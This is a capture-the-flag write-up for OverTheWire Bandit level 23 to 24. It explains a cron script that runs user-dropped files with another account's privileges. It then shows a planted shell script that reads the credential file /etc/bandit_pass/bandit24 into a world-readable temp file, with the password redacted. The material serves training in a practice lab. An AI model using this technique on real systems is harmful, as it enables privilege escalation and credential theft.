---
title: "OverTheWire Bandit Level 23 -> 24"
description: "OverTheWire Bandit Level 23 -> 24 writeup"
---

## Level 23 -> 24
![image.png](../bandit/image%2026.png)

```bash
axii@fedora:~/bandit$ ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls 
behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
donebandit23@bandit:/etc/cron.d$ 
```

Once a minute, the /usr/bin/cronjob_bandit24.sh script is run with bandit24's privileges.

Here is what /usr/bin/cronjob_bandit24.sh does.

shopt is a command that turns shell options on and off.

You enable one with shopt -s [option] and disable it with shopt -u [option].

The nullglob option makes a glob pattern like * expand to nothing when it matches no files.

Example

```bash
shopt -u nullglob
echo *.txt 
*.txt

shopt -s nullglob
echo *.txt
```

myname is bandit24.

Then it changes into the /var/spool/bandit24/foo directory.

With * .* it puts every regular and hidden file into i, excluding . (the current directory) and .. (the parent directory).

It then stores each file's owner name in the owner variable, and if the file is a regular file owned by bandit23 it executes it.

The timeout is 60 seconds.

After that it deletes the file.

In short, among the files in the current directory, only regular files owned by bandit23 run with bandit24's privileges, and then everything is deleted.

So, as the challenge description states, the script must be a regular file in /var/spool/bandit24/foo owned by bandit23. Its contents must read /etc/bandit_pass/bandit24 and write it into tmp.

I created the solution script inside a tmp directory made with mktemp -d.

My command history was wiped because I was using vi, so I'll only attach the commands I ran via history.

```bash
mktemp -d
ls -ld /tmp/tmp.JtGkrKrMZL
chmod 777 /tmp/tmp.JtGkrKrMZL
ls -ld /tmp/tmp.JtGkrKrMZL
vi /tmp/tmp.JtGkrKrMZL/sol24.sh
```

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > "$tmpdir/pass24"
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.JtGkrKrMZL/pw24
chmod 777 /tmp/tmp.JtGkrKrMZL/pw24
```

```bash
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/tmp.JtGkrKrMZL/sol24.sh 
bandit23@bandit:/etc/cron.d$ cp /tmp/tmp.JtGkrKrMZL/sol24.sh /etc/bandit_pass/bandit24 
cp: cannot create regular file '/etc/bandit_pass/bandit24': Operation not permitted
bandit23@bandit:/etc/cron.d$ cp /tmp/tmp.JtGkrKrMZL/sol24.sh /var/spool/bandit24/foo  
bandit23@bandit:/etc/cron.d$ cat /tmp/tmp.JtGkrKrMZL/pw24 
<redacted>
```
